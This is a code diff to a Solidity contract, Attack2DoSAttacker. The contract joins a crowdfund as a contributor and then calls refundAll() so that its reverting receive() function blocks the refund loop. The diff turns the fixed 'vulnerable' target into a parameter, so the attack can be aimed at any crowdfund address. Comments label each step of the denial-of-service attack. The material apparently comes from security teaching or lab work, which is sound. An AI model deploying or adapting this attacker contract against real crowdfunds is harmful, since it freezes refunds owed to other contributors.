@@ -8,7 +8,7 @@ interface ICrowdfundBulkRefund {
 
 contract Attack2DoSAttacker {
     address payable public attacker;
-    ICrowdfundBulkRefund public vulnerable;
+    
 
     modifier onlyAttacker() {
         require(msg.sender == attacker, "Not attacker");
@@ -18,9 +18,9 @@ contract Attack2DoSAttacker {
     event JoinedCrowdfund(address indexed attacker, uint256 amount);
     event RefundAllBlocked(address indexed attacker);
 
-    constructor(address _vulnerable, address _attacker) {
+    constructor(address _attacker) {
         attacker = payable(_attacker);
-        vulnerable = ICrowdfundBulkRefund(_vulnerable);
+        
     }
 
     // STEP 0: EOA funds this contract so it can contribute on-chain
@@ -28,17 +28,20 @@ contract Attack2DoSAttacker {
 
     // STEP 1: Send ETH from this contract into the crowdfund so the contract
     // address shows up as a contributor (required for the DoS fallback).
-    function joinCrowdfund(uint256 amount) external onlyAttacker {
+    function joinCrowdfund(address targetCrowdfund, uint256 amount) external onlyAttacker {
         require(amount > 0, "Amount required");
         require(address(this).balance >= amount, "Not enough balance");
+        require(targetCrowdfund != address(0), "Target required");
 
-        vulnerable.contribute{value: amount}();
+        ICrowdfundBulkRefund(targetCrowdfund).contribute{value: amount}();
         emit JoinedCrowdfund(attacker, amount);
     }
 
     // STEP 2: Call refundAll() – the receive() below will revert to block the loop.
-    function triggerRefundAll() external onlyAttacker {
-        vulnerable.refundAll();
+    function triggerRefundAll(address targetCrowdfund) external onlyAttacker {
+        require(targetCrowdfund != address(0), "Target required");
+
+        ICrowdfundBulkRefund(targetCrowdfund).refundAll();
         emit RefundAllBlocked(attacker);
     }
 
